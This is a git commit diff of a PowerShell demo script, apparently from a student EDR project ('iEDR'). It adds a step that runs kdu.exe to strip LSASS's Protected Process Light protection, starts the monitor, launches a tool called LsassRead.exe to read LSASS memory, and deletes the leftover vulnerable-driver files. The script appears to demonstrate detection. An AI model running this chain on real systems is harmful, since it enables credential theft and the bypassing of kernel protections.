e0f5d8a7565d77fca3fbaeb6ad1082613e33d0b8
Levi Cailleret <cailllev@students.zhaw.ch>
2026-06-15 15:52:15 +0200

    redo demos

--- demo/2-lsass.ps1
+++ demo/2-lsass.ps1
@@ -1,11 +1,15 @@
 $r = $PSScriptRoot
-$s = "$PSScriptRoot\LsassRead\LsassRead.exe"
+$s = "$r\LsassRead\LsassRead.exe"
 $p = "C:\Users\Public\Downloads\LsassRead.exe"
 
 if (Test-Path $p) {
 	rm $p -Force
 }
 
+# strip lsass PPL
+Start-Process "$r\LsassRead\kdu.exe" -Args "-ps $((Get-Process lsass).Id) -prv 54" -NoNewWindow
+
+# start monitor
 Start-Process "$r\..\iEDR.exe" -Args "-a $p"
 
 $_= Read-Host "Wait for iEDR startup..."
@@ -14,3 +18,7 @@ cp $s $p
 Write-Host "Copied $s to $p"
 Read-Host "Press ENTER to start $p"
 Start-Process $p -NoNewWindow -Wait
+
+# KDU cleanup
+rm "NeacSafe64.inf"
+rm "NeacSafe64.sys"
